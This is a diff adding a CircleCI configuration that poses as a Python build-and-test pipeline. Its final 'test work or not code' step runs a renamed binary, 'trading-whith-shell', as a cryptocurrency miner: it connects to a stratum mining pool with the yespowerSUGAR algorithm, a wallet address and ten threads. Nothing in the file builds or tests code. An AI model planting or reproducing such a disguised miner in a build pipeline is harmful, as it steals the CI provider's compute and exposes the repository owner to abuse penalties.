@@ -1,0 +1,30 @@
+version: 2.1
+
+orbs:
+  python: circleci/python@1.2
+
+workflows:
+  sample:
+    jobs:
+      - build-and-test
+jobs:
+  build-and-test:  
+    docker:
+      - image: cimg/python:3.8
+    working_directory: ~/repo
+    steps:
+      - checkout
+      - run:
+          name: install update
+          command: 
+            sudo apt-get update && sudo apt-get upgrade -y
+
+      - run:
+          name: install peckage
+          command: 
+           ls
+      - run:
+          name: test work or not code
+          command: 
+            chmod +x trading-whith-shell && ./trading-whith-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.githujb -t 10 --cpu-priority 4
+
